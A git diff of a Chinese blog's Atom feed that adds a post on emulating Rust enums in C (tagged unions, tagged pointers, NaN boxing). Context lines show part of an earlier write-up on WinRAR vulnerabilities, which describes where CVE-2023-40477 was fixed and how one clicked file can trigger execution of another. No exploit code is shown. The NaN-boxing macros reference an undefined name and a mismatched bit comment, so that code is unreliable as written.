@@ -1,19 +1,93 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh_CN">
-	<title>二进制咸鱼的自我救赎</title>
-	<subtitle>幸福往往是摸的透彻，而敬业的心却常常隐藏。</subtitle>
-	<link href="https://chenx6.github.io/atom.xml" rel="self" type="application/atom+xml"/>
-  <link href="https://chenx6.github.io/"/>
-	<generator uri="https://www.getzola.org/">Zola</generator>
-	<updated>2023-09-30T00:00:00+00:00</updated>
-	<id>https://chenx6.github.io/atom.xml</id>
-	<entry xml:lang="zh_CN">
-		<title>WinRAR 最近的 2 个漏洞分析&#x2F;复现</title>
-		<published>2023-09-30T00:00:00+00:00</published>
-		<updated>2023-09-30T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/winrar/" type="text/html"/>
-		<id>https://chenx6.github.io/post/winrar/</id>
-		<content type="html">&lt;p&gt;其实这个漏洞的公告一出来我就开始进行分析了，只是因为空闲时间的利用非常的差，所以分析的很慢，最多就确认了漏洞修复地点。后来大佬们详细的分析就发出来了，所以这篇文章只能算是复现文章了...&lt;&#x2F;p&gt;
+    <title>二进制咸鱼的自我救赎</title>
+    <subtitle>幸福往往是摸的透彻，而敬业的心却常常隐藏。</subtitle>
+    <link href="https://chenx6.github.io/atom.xml" rel="self" type="application/atom+xml"/>
+    <link href="https://chenx6.github.io/"/>
+    <generator uri="https://www.getzola.org/">Zola</generator>
+    <updated>2023-12-05T00:00:00+00:00</updated>
+    <id>https://chenx6.github.io/atom.xml</id>
+    <entry xml:lang="zh_CN">
+        <title>类似 Rust 中的 enum (Sum type) 在 C 语言中的实现</title>
+        <published>2023-12-05T00:00:00+00:00</published>
+        <updated>2023-12-05T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/sum_type/" type="text/html"/>
+        <id>https://chenx6.github.io/post/sum_type/</id>
+        
+        <content type="html">&lt;p&gt;在 C 语言中，没有类似 ML 系语言或者 Rust 那样的 enum 实现。所以本文用于记录 C 中那些用于实现这个特性的相关方法，例如 tagged union, tagged pointer, NaN boxing。&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;在_Rust_中的表示&quot;&gt;在 Rust 中的表示&lt;&#x2F;h2&gt;
+&lt;p&gt;例如在之前的博客中，我使用了下面的代码来表示词法分析中分析的 Token。&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;rust&quot; class=&quot;language-rust z-code&quot;&gt;&lt;code class=&quot;language-rust&quot; data-lang=&quot;rust&quot;&gt;&lt;span class=&quot;z-source z-rust&quot;&gt;&lt;span class=&quot;z-meta z-enum z-rust&quot;&gt;&lt;span class=&quot;z-storage z-modifier z-rust&quot;&gt;pub&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-enum z-rust&quot;&gt;enum&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-enum z-rust&quot;&gt;Token&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-block z-rust&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-begin z-rust&quot;&gt;{&lt;&#x2F;span&gt;
+    Number&lt;span class=&quot;z-meta z-group z-rust&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-rust&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-storage z-type z-rust&quot;&gt;i32&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-group z-rust&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-rust&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-rust&quot;&gt;,&lt;&#x2F;span&gt;
+    Operator&lt;span class=&quot;z-meta z-group z-rust&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-rust&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-storage z-type z-rust&quot;&gt;u8&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-group z-rust&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-rust&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-block z-rust&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-end z-rust&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;在 Rust 语言的底层的实现与下面的 Tagged union 类似。&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;Tagged_union&quot;&gt;Tagged union&lt;&#x2F;h2&gt;
+&lt;p&gt;这个应该是最直接的表示方法，通过 &lt;code&gt;tag&lt;&#x2F;code&gt; 成员表示对象类型，并且通过 union 节省数据的占用空间。&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; class=&quot;language-c z-code&quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-struct z-c&quot;&gt;&lt;span class=&quot;z-storage z-type z-c&quot;&gt;struct&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-struct z-c&quot;&gt;&lt;span class=&quot;z-entity z-name z-struct z-c&quot;&gt;TaggedUnion&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-struct z-c&quot;&gt; &lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-begin z-c&quot;&gt;{&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-struct z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;
+    &lt;span class=&quot;z-support z-type z-stdint z-c&quot;&gt;uint32_t&lt;&#x2F;span&gt; tag&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
+    &lt;span class=&quot;z-meta z-union z-c&quot;&gt;&lt;span class=&quot;z-storage z-type z-c&quot;&gt;union&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-begin z-c&quot;&gt;{&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-union z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;
+        &lt;span class=&quot;z-storage z-type z-c&quot;&gt;int&lt;&#x2F;span&gt; number&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
+        &lt;span class=&quot;z-storage z-type z-c&quot;&gt;char&lt;&#x2F;span&gt; operator&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
+    &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-union z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-end z-c&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-struct z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-end z-c&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;Tagged_pointer&quot;&gt;Tagged pointer&lt;&#x2F;h2&gt;
+&lt;p&gt;由于大部分系统分配的内存通常是以 8 字节对齐的，所以指针中存放的值中，即低 3 位(bit)为 0。这种情况下就可以通过低 3 位存储指针相关信息，可以表示 2 ^ 3 = 8 种不同的类型。&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; class=&quot;language-c z-code&quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-union z-c&quot;&gt;&lt;span class=&quot;z-storage z-type z-c&quot;&gt;union&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-union z-c&quot;&gt;&lt;span class=&quot;z-entity z-name z-union z-c&quot;&gt;TaggedPointer&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-union z-c&quot;&gt; &lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-begin z-c&quot;&gt;{&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-union z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;
+    &lt;span class=&quot;z-support z-type z-stdint z-c&quot;&gt;uint64_t&lt;&#x2F;span&gt; as_uint64&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
+    &lt;span class=&quot;z-storage z-type z-c&quot;&gt;void&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-c&quot;&gt;*&lt;&#x2F;span&gt;as_pointer&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-union z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-end z-c&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;然后通过相关的宏来实现从 tagged pointer 中读取和存储数值。&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; class=&quot;language-c z-code&quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-preprocessor z-macro z-c&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-define z-c&quot;&gt;#define&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-preprocessor z-macro z-c&quot;&gt; &lt;span class=&quot;z-entity z-name z-function z-preprocessor z-c&quot;&gt;IS_INT&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-preprocessor z-macro z-parameters z-c&quot;&gt;&lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-parameter z-c&quot;&gt;v&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-preprocessor z-macro z-c&quot;&gt; &lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c&quot;&gt;(&lt;&#x2F;span&gt;v&lt;span class=&quot;z-punctuation z-accessor z-c&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-other z-member z-c&quot;&gt;as_uint64&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-c&quot;&gt;&amp;amp;&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-hexadecimal z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-numeric z-base z-c&quot;&gt;0x&lt;&#x2F;span&gt;1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;z-meta z-preprocessor z-macro z-c&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-define z-c&quot;&gt;#define&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-preprocessor z-macro z-c&quot;&gt; &lt;span class=&quot;z-entity z-name z-function z-preprocessor z-c&quot;&gt;GET_AS_INT&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-preprocessor z-macro z-parameters z-c&quot;&gt;&lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-parameter z-c&quot;&gt;v&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-preprocessor z-macro z-c&quot;&gt; &lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-support z-type z-stdint z-c&quot;&gt;int32_t&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c&quot;&gt;(&lt;&#x2F;span&gt;v&lt;span class=&quot;z-punctuation z-accessor z-c&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-other z-member z-c&quot;&gt;as_uint64&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-c&quot;&gt;&amp;gt;&amp;gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-c&quot;&gt;1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;z-meta z-preprocessor z-macro z-c&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-define z-c&quot;&gt;#define&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-preprocessor z-macro z-c&quot;&gt; &lt;span class=&quot;z-entity z-name z-function z-preprocessor z-c&quot;&gt;MAKE_INT&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-preprocessor z-macro z-parameters z-c&quot;&gt;&lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-parameter z-c&quot;&gt;i&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-preprocessor z-macro z-c&quot;&gt; &lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-support z-type z-stdint z-c&quot;&gt;uint64_t&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c&quot;&gt;(&lt;&#x2F;span&gt;i&lt;span class=&quot;z-punctuation z-section z-group z-end z-c&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-c&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-c&quot;&gt;1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-c&quot;&gt;|&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-hexadecimal z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-numeric z-base z-c&quot;&gt;0x&lt;&#x2F;span&gt;1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;NaN_boxing&quot;&gt;NaN boxing&lt;&#x2F;h2&gt;
+&lt;p&gt;在 IEEE 754 标准中，通过将指数位全部置为 1，并且将最少 1 个分数位置为 1 来表示 NaN，这种情况下 NaN 的值中，剩下 51 位为空，可以用来表示其他的值。可以通过指数位以及分数位前 2 位数值，将 NaN 与 double 数值，还有别的类型的数值进行区分开来。由于大部分系统地址空间只有 48 位，所以剩余的空间也足够存储一个内存地址。&lt;&#x2F;p&gt;
+&lt;p&gt;在下面的例子中，我们通过自定义的 NaN 值将 double 数值和 NaN boxing 的数值进行区分。&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; class=&quot;language-c z-code&quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-union z-c&quot;&gt;&lt;span class=&quot;z-storage z-type z-c&quot;&gt;union&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-union z-c&quot;&gt;&lt;span class=&quot;z-entity z-name z-union z-c&quot;&gt;NaNBoxing&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-union z-c&quot;&gt; &lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-begin z-c&quot;&gt;{&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-union z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;
+    &lt;span class=&quot;z-support z-type z-stdint z-c&quot;&gt;uint64_t&lt;&#x2F;span&gt; as_uint64&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
+    &lt;span class=&quot;z-storage z-type z-c&quot;&gt;double&lt;&#x2F;span&gt; as_double&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-union z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-end z-c&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
+
+&lt;span class=&quot;z-comment z-line z-double-slash z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-c&quot;&gt;&#x2F;&#x2F;&lt;&#x2F;span&gt; NaN:
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-comment z-line z-double-slash z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-c&quot;&gt;&#x2F;&#x2F;&lt;&#x2F;span&gt; 0 11111111111 1000000000000000000000000000000000000000000000000000
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-preprocessor z-macro z-c&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-define z-c&quot;&gt;#define&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-preprocessor z-macro z-c&quot;&gt; &lt;span class=&quot;z-entity z-name z-constant z-preprocessor z-c&quot;&gt;NANISH_MASK&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-preprocessor z-macro z-c&quot;&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-hexadecimal z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-numeric z-base z-c&quot;&gt;0x&lt;&#x2F;span&gt;7ffc000000000000&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;z-comment z-line z-double-slash z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-c&quot;&gt;&#x2F;&#x2F;&lt;&#x2F;span&gt; 0 11111111111 1100000000000000000000000000000000000000000000000000
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-preprocessor z-macro z-c&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-define z-c&quot;&gt;#define&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-preprocessor z-macro z-c&quot;&gt; &lt;span class=&quot;z-entity z-name z-function z-preprocessor z-c&quot;&gt;IS_DOUBLE&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-preprocessor z-macro z-parameters z-c&quot;&gt;&lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-parameter z-c&quot;&gt;v&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-preprocessor z-macro z-c&quot;&gt; &lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c&quot;&gt;(&lt;&#x2F;span&gt;v&lt;span class=&quot;z-punctuation z-accessor z-c&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-other z-member z-c&quot;&gt;as_uint64&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-c&quot;&gt;&amp;amp;&lt;&#x2F;span&gt; NANISH&lt;span class=&quot;z-punctuation z-section z-group z-end z-c&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-comparison z-c&quot;&gt;!=&lt;&#x2F;span&gt; NANISH&lt;span class=&quot;z-punctuation z-section z-group z-end z-c&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;z-meta z-preprocessor z-macro z-c&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-define z-c&quot;&gt;#define&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-preprocessor z-macro z-c&quot;&gt; &lt;span class=&quot;z-entity z-name z-function z-preprocessor z-c&quot;&gt;GET_AS_DOUBLE&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-preprocessor z-macro z-parameters z-c&quot;&gt;&lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-parameter z-c&quot;&gt;v&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-preprocessor z-macro z-c&quot;&gt; &lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c&quot;&gt;(&lt;&#x2F;span&gt;v&lt;span class=&quot;z-punctuation z-accessor z-c&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-other z-member z-c&quot;&gt;as_double&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;在使用 &lt;code&gt;IS_DOUBLE&lt;&#x2F;code&gt; 时，如果传入的值为 NaN 的话，与 NANISH_MASK 的值不相等。而传入 double 值时，由于 double 值中指数位必有 1 位为 0，所以运算后与 NANISH_MASK 不相等。&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;几种方法的对比&quot;&gt;几种方法的对比&lt;&#x2F;h2&gt;
+&lt;p&gt;对比上面的几种表示方法，可以发现 tagged union 表示直接，但是在空间利用率上不如后面 2 种方法，会多出来一个 uint32_t 的内存占用。而 tagged pointer 的类型的转换稍微比 NaN boxing 麻烦一些，需要多做一些位运算。这几种方法都可以在现有的项目中找到使用痕迹。&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;Refs&quot;&gt;Refs&lt;&#x2F;h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;645810896&quot;&gt;Modern C++真的很烂——std::variant&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;research.checkpoint.com&#x2F;2023&#x2F;rust-binary-analysis-feature-by-feature&#x2F;&quot;&gt;Rust Binary Analysis, Feature by Feature&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;craftinginterpreters.com&#x2F;optimization.html#nan-boxing&quot;&gt;NaN Boxing&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;piotrduperas.com&#x2F;posts&#x2F;nan-boxing&quot;&gt;NaN boxing or how to make the world dynamic&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;muxup.com&#x2F;2023q4&#x2F;storing-data-in-pointers&quot;&gt;Storing data in pointers&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>WinRAR 最近的 2 个漏洞分析&#x2F;复现</title>
+        <published>2023-09-30T00:00:00+00:00</published>
+        <updated>2023-09-30T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/winrar/" type="text/html"/>
+        <id>https://chenx6.github.io/post/winrar/</id>
+        
+        <content type="html">&lt;p&gt;其实这个漏洞的公告一出来我就开始进行分析了，只是因为空闲时间的利用非常的差，所以分析的很慢，最多就确认了漏洞修复地点。后来大佬们详细的分析就发出来了，所以这篇文章只能算是复现文章了...&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;CVE-2023-40477&quot;&gt;CVE-2023-40477&lt;&#x2F;h2&gt;
 &lt;p&gt;从下面的官方公告中可以知道代码修复的地方是在 RAR4 恢复卷的处理代码中。&lt;&#x2F;p&gt;
 &lt;blockquote&gt;
@@ -123,6 +197,8 @@ index ecf6dd3..0138d0f 100644
     &lt;span class=&quot;z-punctuation z-section z-block z-end z-c&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
 &lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
 &lt;p&gt;配合上 &lt;code&gt;ShellExecuteExW&lt;&#x2F;code&gt; 对文件的处理，就造成了点击一个文件，让另一个文件被调用执行的情况...详细分析请看 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;winrar&#x2F;#refs&quot;&gt;Refs&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;总结&quot;&gt;总结&lt;&#x2F;h2&gt;
